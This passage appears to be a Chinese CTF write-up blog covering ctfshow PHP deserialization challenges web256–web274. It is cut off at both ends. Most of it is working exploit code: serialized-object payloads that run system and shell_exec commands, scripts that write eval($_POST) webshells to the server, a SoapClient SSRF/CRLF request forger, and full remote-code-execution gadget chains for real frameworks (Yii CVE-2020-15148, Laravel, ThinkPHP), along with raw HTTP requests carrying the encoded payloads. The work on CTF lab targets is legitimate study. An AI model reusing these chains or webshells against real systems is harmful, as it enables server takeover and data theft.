user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22123123%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22123123%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\n\n\n```\n\n## web256\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-02 17:44:47\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-02 19:29:02\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            if($this->username!==$this->password){\n                    echo \"your flag is \".$flag;\n              }\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n```\n\n让username和password不相等就行\n\n```text\nGET /?username=123123&password=123 HTTP/1.1\nHost: fae97846-6fba-43a4-ae9a-6bc9ffd9c6e8.challenge.ctf.show\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22123123%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22123%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\n\n\n```\n\n## web257\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-02 17:44:47\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-02 20:33:07\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser{\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n\n    public function __construct(){\n        $this->class=new info();\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function __destruct(){\n        $this->class->getInfo();\n    }\n\n}\n\nclass info{\n    private $user='xxxxxx';\n    public function getInfo(){\n        return $this->user;\n    }\n}\n\nclass backDoor{\n    private $code;\n    public function getInfo(){\n        eval($this->code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);\n    $user->login($username,$password);\n}\n```\n\n这里的话链子还是很简单的，出口在`backDoor::getInfo()`\n\n```\nctfShowUser::__destruct()->backDoor::getInfo()\n```\n\nexp\n\n```php\n<?php\nclass ctfShowUser{\n    private $username;\n    private $password;\n    private $isVip;\n    public $class;\n}\nclass backDoor{\n    public $code;\n}\n$a = new ctfShowUser();\n$a -> class = new backDoor();\n$a -> class ->code = \"system('ls');\";\necho urlencode(serialize($a));\n```\n\n7.1版本以上的php是对属性类型不敏感的\n\n```\nGET /?username=1&password=1 HTTP/1.1\nHost: cceb8af2-1478-4455-b690-12a373b06f24.challenge.ctf.show\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3BN%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3BN%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3BN%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\n\n\n```\n\n然后读flag就行\n\n## web258\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-02 17:44:47\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-02 21:38:56\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct(){\n        $this->class=new info();\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function __destruct(){\n        $this->class->getInfo();\n    }\n\n}\n\nclass info{\n    public $user='xxxxxx';\n    public function getInfo(){\n        return $this->user;\n    }\n}\n\nclass backDoor{\n    public $code;\n    public function getInfo(){\n        eval($this->code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){\n        $user = unserialize($_COOKIE['user']);\n    }\n    $user->login($username,$password);\n}\n```\n\n这里增加了正则匹配，在数字前面用+号就可以绕过了\n\n```php\n<?php\n\nclass ctfShowUser{\n    public $username;\n    public $password;\n    public $isVip;\n    public $class;\n}\nclass backDoor{\n    public $code;\n}\n$a = new ctfShowUser();\n$a -> class = new backDoor();\n$a -> class -> code = \"system('ls');\";\n$b = serialize($a);\n//O:11:\"ctfShowUser\":4:{s:8:\"username\";N;s:8:\"password\";N;s:5:\"isVip\";N;s:5:\"class\";O:8:\"backDoor\":1:{s:4:\"code\";s:13:\"system('ls');\";}}\n$b = str_replace(\"O:\", \"O:+\", $b);\n//echo $b;\n//O:+11:\"ctfShowUser\":4:{s:8:\"username\";N;s:8:\"password\";N;s:5:\"isVip\";N;s:5:\"class\";O:+8:\"backDoor\":1:{s:4:\"code\";s:13:\"system('ls');\";}}\necho urlencode($b);\n//O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3BN%3Bs%3A8%3A%22password%22%3BN%3Bs%3A5%3A%22isVip%22%3BN%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D\n```\n\n## web259\n\n```php\nflag.php\n\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n```\n\n```php\nindex.php\n\n<?php\n\nhighlight_file(__FILE__);\n\n\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n```\n\n这里的话并没有类可以使用，所以需要用原生类SoapClient 类\n\nPHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。\n\n该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求，进而造成SSRF\n\n所以我们需要利用SoapClient原生类来构造**SSRF**（用服务器本身请求服务器），并利用**CRLF**来构造数据包。\n\n所以我们的payload\n\n```php\n<?php\n$ua = \"test\\r\\nX-Forwarded-For: 127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 13\\r\\n\\r\\ntoken=ctfshow\";\n$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => $ua));\necho urlencode(serialize($client));\n```\n\n## web260\n\n```php\n<?php\n$a = \"ctfshow_i_love_36D\";\necho serialize($a);\n//s:18:\"ctfshow_i_love_36D\";\n```\n\n正则匹配的字符串是有的，直接传?ctfshow=ctfshow_i_love_36D就行\n\n## web261\n\n```php\n<?php\n\nhighlight_file(__FILE__);\n\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        $this->username=$u;\n        $this->password=$p;\n    }\n    public function __wakeup(){\n        if($this->username!='' || $this->password!=''){\n            die('error');\n        }\n    }\n    public function __invoke(){\n        eval($this->code);\n    }\n\n    public function __sleep(){\n        $this->username='';\n        $this->password='';\n    }\n    public function __unserialize($data){\n        $this->username=$data['username'];\n        $this->password=$data['password'];\n        $this->code = $this->username.$this->password;\n    }\n    public function __destruct(){\n        if($this->code==0x36d){\n            file_put_contents($this->username, $this->password);\n        }\n    }\n}\n\nunserialize($_GET['vip']);\n```\n\n很简单的反序列化，把链子写一下，不会写链子的可以看我之前关于php反序列化的文章\n\n如果类中同时定义了 `__unserialize()` 和 `__wakeup()` 两个魔术方法，则只有 `__unserialize() `方法会生效，`wakeup() `方法会被忽略。\n\n这里的话`__invoke`是没办法去触发的，所以从`__destruct`入手\n\n```php\n<?php\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n    public function __wakeup(){\n        if($this->username!='' || $this->password!=''){\n            die('error');\n        }\n    }\n    public function __unserialize($data){\n        $this->username=$data['username'];\n        $this->password=$data['password'];\n        $this->code = $this->username.$this->password;\n    }\n    public function __destruct(){\n        if($this->code==0x36d){\n            file_put_contents($this->username, $this->password);\n        }\n    }\n}\n$a = new ctfshowvip();\n$a -> username = \"877.php\";\n$a -> password = \"<?php eval(\\$_POST['cmd']);?>\";\n$b = serialize($a);\necho urlencode($b);\n```\n\n这里的话code是在`__unserialize`中进行赋值的，且是弱比较，所以让username为0x36d的十进制877则可以绕过比较\n\n## web262\n\n```php\n<?php\nerror_reporting(0);\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) && isset($m) && isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n```\n\n有字符替换，那就是字符串逃逸了\n\n这里会设置cookie，猜是需要让token伪造为admin\n\n原先的字符串\n\n```\nO:7:\"message\":4:{s:4:\"from\";N;s:3:\"msg\";N;s:2:\"to\";N;s:5:\"token\";s:4:\"user\";}\n```\n\n字符增多的逃逸，构造需要逃逸的字符\n\n```\n\";s:5:\"token\";s:5:\"admin\";}//27个\n```\n\n每替换一个多出一个字符，构造27个fuck\n\n```php\n<?php\nclass message{\n    public $from=\"1\";\n    public $msg=\"2\";\n    public $to=\"fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\\\";s:5:\\\"token\\\";s:5:\\\"admin\\\";}\";\n    public $token='user';\n}\n$a = new message();\n//echo serialize($a);\n//O:7:\"message\":4:{s:4:\"from\";N;s:3:\"msg\";N;s:2:\"to\";s:135:\"fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:4:\"user\";}\necho str_replace('fuck', 'loveU', serialize($a));\n//O:7:\"message\":4:{s:4:\"from\";N;s:3:\"msg\";N;s:2:\"to\";s:135:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:4:\"user\";}\n```\n\n成功逃逸，按着传参就行，访问message.php拿到flag\n\n还有一个非预期解就是直接把token改成admin然后构造序列化字符串传入cookie\n\n## web263\n\n一个登录口，有/www.zip备份\n\n```php\n//check.php\n<?php\n\nerror_reporting(0);\nrequire_once 'inc/inc.php';\n$GET = array(\"u\"=>$_GET['u'],\"pass\"=>$_GET['pass']);\n\n\nif($GET){\n\n\t$data= $db->get('admin',\n\t[\t'id',\n\t\t'UserName0'\n\t],[\n\t\t\"AND\"=>[\n\t\t\"UserName0[=]\"=>$GET['u'],\n\t\t\"PassWord1[=]\"=>$GET['pass'] //密码必须为128位大小写字母+数字+特殊符号，防止爆破\n\t\t]\n\t]);\n\tif($data['id']){\n\t\t//登陆成功取消次数累计\n\t\t$_SESSION['limit']= 0;\n\t\techo json_encode(array(\"success\",\"msg\"=>\"欢迎您\".$data['UserName0']));\n\t}else{\n\t\t//登陆失败累计次数加1\n\t\t$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);\n\t\techo json_encode(array(\"error\",\"msg\"=>\"登陆失败\"));\n\t}\n}\n```\n\n```php\n//inc.php\n<?php\nerror_reporting(0);\nini_set('display_errors', 0);\nini_set('session.serialize_handler', 'php');\ndate_default_timezone_set(\"Asia/Shanghai\");\nsession_start();\nuse \\CTFSHOW\\CTFSHOW; \nrequire_once 'CTFSHOW.php';\n$db = new CTFSHOW([\n    'database_type' => 'mysql',\n    'database_name' => 'web',\n    'server' => 'localhost',\n    'username' => 'root',\n    'password' => 'root',\n    'charset' => 'utf8',\n    'port' => 3306,\n    'prefix' => '',\n    'option' => [\n        PDO::ATTR_CASE => PDO::CASE_NATURAL\n    ]\n]);\n\n// sql注入检查\nfunction checkForm($str){\n    if(!isset($str)){\n        return true;\n    }else{\n    return preg_match(\"/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\\`|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\\|\\&|\\*|\\(|\\)|\\（|\\）|\\+|\\=|\\[|\\]|\\;|\\:|\\'|\\\"|\\<|\\,|\\>|\\?/i\",$str);\n    }\n}\n\n\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n\n/*生成唯一标志\n*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)\n*/\n\nfunction  uuid()  \n{  \n    $chars = md5(uniqid(mt_rand(), true));  \n    $uuid = substr ( $chars, 0, 8 ) . '-'\n            . substr ( $chars, 8, 4 ) . '-' \n            . substr ( $chars, 12, 4 ) . '-'\n            . substr ( $chars, 16, 4 ) . '-'\n            . substr ( $chars, 20, 12 );  \n    return $uuid ;  \n}  \n```\n\n```php\n//index.php\n\terror_reporting(0);\n\tsession_start();\n\t//超过5次禁止登陆\n\tif(isset($_SESSION['limit'])){\n\t\t$_SESSION['limti']>5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n\t\t$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n\t}else{\n\t\t setcookie(\"limit\",base64_encode('1'));\n\t\t $_SESSION['limit']= 1;\n\t}\n\t\n?>\n```\n\n在inc.php看到一个`ini_set`对序列化引擎的设置，然后开启了session，猜测是session反序列化，并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控，可以进行文件包含geshell\n\n构造exp\n\n```php\n<?php\nclass User\n{\n    public $username;\n    public $password;\n    public $status=1;\n}\n$a = new User();\n$a -> username = \"shell.php\";\n$a -> password = \"<?php eval(\\$_POST[2]);?>\";\necho base64_encode('|'.serialize($a));\n//fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo5OiJzaGVsbC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MjQ6Ijw/cGhwIGV2YWwoJF9QT1NUWzJdKTs/PiI7czo2OiJzdGF0dXMiO2k6MTt9\n```\n\nindex.php没有包含inc/inc.php，session反序列化的触发点在inc.php中，因此带着cookie访问index.php并不能成功反序列化User类的对象。但访问index.php后，cookie中的limit被base64解码并被写入PHPSESSID对应名字的session文件中。 然后用同样的PHPSESSID再访问inc/inc.php时，会触发session_start()的read函数;会读取PHPSESSID对应名字的session文件并尝试反序列化，然后触发__destruct函数写入webshell\n\n在index.php文件下设置cookie传入payload后访问/inc/inc.php触发反序列化，然后访问log-shell.php传参rce就行了\n\n一开始以为是生成在/inc目录下，后来发现是在根目录\n\n## web264\n\n```php\nerror_reporting(0);\nsession_start();\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) && isset($m) && isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    $_SESSION['msg']=base64_encode($umsg);\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n```\n\n跟刚刚那个字符串逃逸一样啊，访问message.php看一下\n\n```php\nsession_start();\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    }\n}\n\nif(isset($_COOKIE['msg'])){\n    $msg = unserialize(base64_decode($_SESSION['msg']));\n    if($msg->token=='admin'){\n        echo $flag;\n    }\n}\n```\n\n其实做法是差不多的，不过就是把内容放到了session里面了，正常传参然后在message.php页面随便传个cookie：msg=1触发反序列化就行\n\n## web265\n\n```php\nerror_reporting(0);\ninclude('flag.php');\nhighlight_file(__FILE__);\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n\n    public function __construct($t,$p){\n        $this->token=$t;\n        $this->password = $p;\n    }\n    public function login(){\n        return $this->token===$this->password;\n    }\n}\n\n$ctfshow = unserialize($_GET['ctfshow']);\n$ctfshow->token=md5(mt_rand());\n\nif($ctfshow->login()){\n    echo $flag;\n}\n```\n\n地址引用就行了，让password指向token\n\n在 PHP 中引用意味着用不同的名字访问同一个变量内容。这并不像 C 的指针\n\n```php\n<?php\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n}\n$a = new ctfshowAdmin();\n$a -> password = &$a->token;\necho urlencode(serialize($a));\n//O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D\n```\n\n## web266\n\n```php\n<?php\nhighlight_file(__FILE__);\n\ninclude('flag.php');\n$cs = file_get_contents('php://input');\n\n\nclass ctfshow{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public function __construct($u,$p){\n        $this->username=$u;\n        $this->password=$p;\n    }\n    public function login(){\n        return $this->username===$this->password;\n    }\n    public function __toString(){\n        return $this->username;\n    }\n    public function __destruct(){\n        global $flag;\n        echo $flag;\n    }\n}\n$ctfshowo=@unserialize($cs);\nif(preg_match('/ctfshow/', $cs)){\n    throw new Exception(\"Error $ctfshowo\",1);\n}\n```\n\n其实这里的话有两种方法，一种是绕过if语句，一种是绕过GC回收机制\n\n绕过GC回收机制，其实就是让他提前触发，设置一个非法数组对象就行\n\n调试过程\n\n![image-20250522145601073](../image/achieve/202411/PHP反序列化/image-20250522145601073.png)\n\nexp\n\n```php\n<?php\nclass ctfshow{\n    public $username;\n    public $password;\n}\n$a = new ctfshow();\n$b = serialize(array($a,null));\n$c = str_replace(\"i:1;N\",\"i:0;N\",$b);\necho $c;\n```\n\n直接POST传就行\n\n```html\nGET / HTTP/1.1\nHost: 7a057240-d351-485c-8737-50344637e16a.challenge.ctf.show\nConnection: keep-alive\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://7a057240-d351-485c-8737-50344637e16a.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: zh-CN,zh;q=0.9\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8\n\na:2:{i:0;O:7:\"ctfshow\":2:{s:8:\"username\";N;s:8:\"password\";N;}i:0;N;}\n```\n\n## web267\n\nwappalyzer直接抛出是yii框架，查到一个yii框架的反序列化漏洞CVE-2020-15148\n\n在登录界面弱口令admin/admin可以登录\n\n在about界面查看源码，有`<!--?view-source -->`提示\n\n尝试传入`/index.php?r=site%2Fabout&view-source`发现拿到源码\n\n```\n///backdoor/shell\nunserialize(base64_decode($_GET['code']))\n```\n\n链子的话在复现的时候已经学过了，这里直接打\n\n但用system不知道为什么没有回显，试一下shell_exec\n\n```php\n<?php\n\nnamespace yii\\rest{\n    class IndexAction{\n        public $checkAccess;\n        public $id;\n        public function __construct(){\n            $this->checkAccess = 'shell_exec';\n            $this->id = 'ls / | tee 1.txt';\t\t\t\t//命令执行\n        }\n    }\n}\nnamespace Faker {\n\n    use yii\\rest\\IndexAction;\n\n    class Generator\n    {\n        protected $formatters;\n\n        public function __construct()\n        {\n            $this->formatters['close'] = [new IndexAction(), 'run'];\n        }\n    }\n}\nnamespace yii\\db{\n\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n        public function __construct()\n        {\n            $this->_dataReader=new Generator();\n        }\n    }\n}\nnamespace{\n\n    use yii\\db\\BatchQueryResult;\n\n    echo base64_encode(serialize(new BatchQueryResult()));\n}\n```\n\n注意这里是在/backdoor/shell路由下\n\n```\n?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNjoibHMgLyB8IHRlcyAxLnR4dCI7fWk6MTtzOjM6InJ1biI7fX19fQ==\n```\n\n然后访问/1.txt\n\n```\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n```\n\n读flag就行\n\n## web268\n\n上题的wp没用了\n\n继续挖掘一下链子\n\n```php\n<?php\n\nnamespace yii\\rest{\n    class IndexAction{\n        public $checkAccess;\n        public $id;\n        public function __construct(){\n            $this->checkAccess = 'shell_exec';\n            $this->id = 'cat /flags | tee 1.txt';\t\t\t\t//命令执行\n        }\n    }\n}\nnamespace Faker {\n\n    use yii\\rest\\IndexAction;\n\n    class Generator\n    {\n        protected $formatters;\n\n        public function __construct()\n        {\n            $this->formatters['isRunning'] = [new IndexAction(), 'run'];\n        }\n    }\n}\n\nnamespace Codeception\\Extension{\n\n    use Faker\\Generator;\n    class RunProcess\n    {\n        private $processes = [];\n        public function __construct(){\n            $this->processes[]=new Generator();\n        }\n    }\n}\n\nnamespace {\n    use Codeception\\Extension\\RunProcess;\n\n    echo urlencode(base64_encode(serialize(new RunProcess())));\n}\n```\n\n在RunProcess类中的`__destruct()`方法也可以触发`__call()`方法\n\n## web269\n\n之前的链子又不通了，这个yii反序列化的姿势是真多啊\n\n```php\n<?php\nnamespace yii\\rest {\n    class IndexAction\n    {\n        public function __construct()\n        {\n            $this->checkAccess = \"shell_exec\";\n            $this->id = \"cat /f* | tee 1.txt\";\n        }\n    }\n}\nnamespace yii\\web {\n    use yii\\rest\\IndexAction;\n    abstract class MultiFieldSession\n    {\n        public $writeCallback;\n    }\n    class DbSession extends MultiFieldSession\n    {\n        public function __construct()\n        {\n            $this->writeCallback = [new IndexAction(), \"run\"];\n        }\n    }\n}\nnamespace yii\\db {\n    use yii\\base\\BaseObject;\n    use yii\\web\\DbSession;\n    class BatchQueryResult\n    {\n        private $_dataReader;\n        public function __construct()\n        {\n            $this->_dataReader = new DbSession();\n        }\n    }\n}\nnamespace {\n    use yii\\db\\BatchQueryResult;\n    echo(base64_encode(serialize(new BatchQueryResult())));\n}\n```\n\n## web270\n\n上道题的poc也能打，可能这两道题没啥区别？也可能是269的poc用之前的poc也能打吧\n\n## web271\n\nLaravel的反序列化漏洞https://blog.csdn.net/byname1/article/details/137176425\n\n去复现完就直接打\n\nexp\n\n```php\n<?php\nnamespace Illuminate\\Foundation{\n    class Application\n    {\n        protected $bindings = [];\n\n        public function __construct()\n        {\n            $this->bindings = array(\n                'Illuminate\\Contracts\\Console\\Kernel' => array(\n                    'concrete' => 'Illuminate\\Foundation\\Application'\n                )\n            );\n        }\n    }\n}\nnamespace Illuminate\\Auth{\n    class GenericUser{\n        protected $attributes=[];\n        public function __construct()\n        {\n            $this->attributes['expectedOutput']=['1'];\n            $this->attributes['expectedQuestions']=['1'];\n        }\n    }\n}\nnamespace Illuminate\\Foundation\\Testing{\n\n    use Illuminate\\Auth\\GenericUser;\n    use Illuminate\\Foundation\\Application;\n    class PendingCommand{\n        protected $command;\n        protected $parameters;\n        public $test;\n        protected $app;\n        public function __construct(){\n            $this -> command = \"phpinfo\";\n            $this -> parameters[] = \"1\";\n            $this -> app = new Application();\n            $this -> test = new GenericUser();\n        }\n    }\n}\nnamespace {\n    use Illuminate\\Foundation\\Testing\\PendingCommand;\n    echo urlencode(serialize(new PendingCommand()));\n}\n\n```\n\n![image-20250602154458469](../image/achieve/202411/反序化-ctfshow/image-20250602154458469.png)\n\n成功执行，我们换命令就行\n\n## web272&273\n\n禁用了pendingCommand类，反而换了一种更古老的链子\n\n```php\n<?php\nnamespace Illuminate\\Broadcasting {\n    use Faker\\Generator;\n    class PendingBroadcast {\n        protected $events;\n        protected $event;\n        public function __construct() {\n            $this->events = new Generator();\n            $this->event = 'cat /fl*';\n        }\n    }\n}\n\nnamespace Faker {\n    class Generator {\n        protected $formatters = array();\n        public function __construct(){\n            $this -> formatters = ['dispatch' => 'system'];\n        }\n    }\n}\nnamespace {\n    $a = new Illuminate\\Broadcasting\\PendingBroadcast();\n    echo urlencode(serialize($a));\n}\n\n```\n\n## web274\n\ntp5.1版本的反序列化，值得信赖吗有点意思\n\n具体审框架反序列化的话可以看我[PHP反序列化-TP5.1.x框架]的文章\n\nexp\n\n```php\n<?php\nnamespace think\\process\\pipes{\n    use think\\model\\Pivot;\n\n    class 